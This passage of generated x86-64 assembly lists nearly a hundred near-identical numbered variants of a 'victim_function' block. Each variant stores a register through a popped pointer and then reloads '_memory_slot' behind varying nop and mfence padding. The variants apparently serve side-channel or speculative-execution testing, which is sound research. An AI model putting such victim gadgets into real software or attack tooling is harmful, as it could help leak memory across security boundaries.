	jmp	.Lvictim_function_win0_continue
## Variant 1316
.Lvictim_function_win0_var1316:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1317
.Lvictim_function_win0_var1317:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1318
.Lvictim_function_win0_var1318:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1319
.Lvictim_function_win0_var1319:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1320
.Lvictim_function_win0_var1320:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1321
.Lvictim_function_win0_var1321:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1322
.Lvictim_function_win0_var1322:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1323
.Lvictim_function_win0_var1323:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1324
.Lvictim_function_win0_var1324:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1325
.Lvictim_function_win0_var1325:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1326
.Lvictim_function_win0_var1326:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1327
.Lvictim_function_win0_var1327:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1328
.Lvictim_function_win0_var1328:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1329
.Lvictim_function_win0_var1329:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1330
.Lvictim_function_win0_var1330:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1331
.Lvictim_function_win0_var1331:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1332
.Lvictim_function_win0_var1332:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1333
.Lvictim_function_win0_var1333:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1334
.Lvictim_function_win0_var1334:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1335
.Lvictim_function_win0_var1335:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1336
.Lvictim_function_win0_var1336:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1337
.Lvictim_function_win0_var1337:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1338
.Lvictim_function_win0_var1338:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1339
.Lvictim_function_win0_var1339:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1340
.Lvictim_function_win0_var1340:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1341
.Lvictim_function_win0_var1341:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1342
.Lvictim_function_win0_var1342:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1343
.Lvictim_function_win0_var1343:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1344
.Lvictim_function_win0_var1344:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1345
.Lvictim_function_win0_var1345:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1346
.Lvictim_function_win0_var1346:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1347
.Lvictim_function_win0_var1347:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1348
.Lvictim_function_win0_var1348:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1349
.Lvictim_function_win0_var1349:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1350
.Lvictim_function_win0_var1350:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1351
.Lvictim_function_win0_var1351:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1352
.Lvictim_function_win0_var1352:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1353
.Lvictim_function_win0_var1353:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1354
.Lvictim_function_win0_var1354:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1355
.Lvictim_function_win0_var1355:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1356
.Lvictim_function_win0_var1356:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1357
.Lvictim_function_win0_var1357:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	nop
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1358
.Lvictim_function_win0_var1358:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1359
.Lvictim_function_win0_var1359:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1360
.Lvictim_function_win0_var1360:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1361
.Lvictim_function_win0_var1361:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1362
.Lvictim_function_win0_var1362:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1363
.Lvictim_function_win0_var1363:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1364
.Lvictim_function_win0_var1364:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1365
.Lvictim_function_win0_var1365:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1366
.Lvictim_function_win0_var1366:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1367
.Lvictim_function_win0_var1367:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1368
.Lvictim_function_win0_var1368:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1369
.Lvictim_function_win0_var1369:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1370
.Lvictim_function_win0_var1370:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1371
.Lvictim_function_win0_var1371:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1372
.Lvictim_function_win0_var1372:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1373
.Lvictim_function_win0_var1373:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1374
.Lvictim_function_win0_var1374:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1375
.Lvictim_function_win0_var1375:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1376
.Lvictim_function_win0_var1376:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1377
.Lvictim_function_win0_var1377:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1378
.Lvictim_function_win0_var1378:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1379
.Lvictim_function_win0_var1379:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1380
.Lvictim_function_win0_var1380:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1381
.Lvictim_function_win0_var1381:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1382
.Lvictim_function_win0_var1382:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1383
.Lvictim_function_win0_var1383:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1384
.Lvictim_function_win0_var1384:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1385
.Lvictim_function_win0_var1385:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1386
.Lvictim_function_win0_var1386:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1387
.Lvictim_function_win0_var1387:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1388
.Lvictim_function_win0_var1388:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1389
.Lvictim_function_win0_var1389:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1390
.Lvictim_function_win0_var1390:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1391
.Lvictim_function_win0_var1391:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1392
.Lvictim_function_win0_var1392:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1393
.Lvictim_function_win0_var1393:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1394
.Lvictim_function_win0_var1394:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1395
.Lvictim_function_win0_var1395:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1396
.Lvictim_function_win0_var1396:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1397
.Lvictim_function_win0_var1397:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1398
.Lvictim_function_win0_var1398:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1399
.Lvictim_function_win0_var1399:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1400
.Lvictim_function_win0_var1400:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1401
.Lvictim_function_win0_var1401:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1402
.Lvictim_function_win0_var1402:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1403
.Lvictim_function_win0_var1403:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1404
.Lvictim_function_win0_var1404:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1405
.Lvictim_function_win0_var1405:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1406
.Lvictim_function_win0_var1406:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1407
.Lvictim_function_win0_var1407:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1408
.Lvictim_function_win0_var1408:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1409
.Lvictim_function_win0_var1409:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1410
.Lvictim_function_win0_var1410:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1411
.Lvictim_function_win0_var1411:
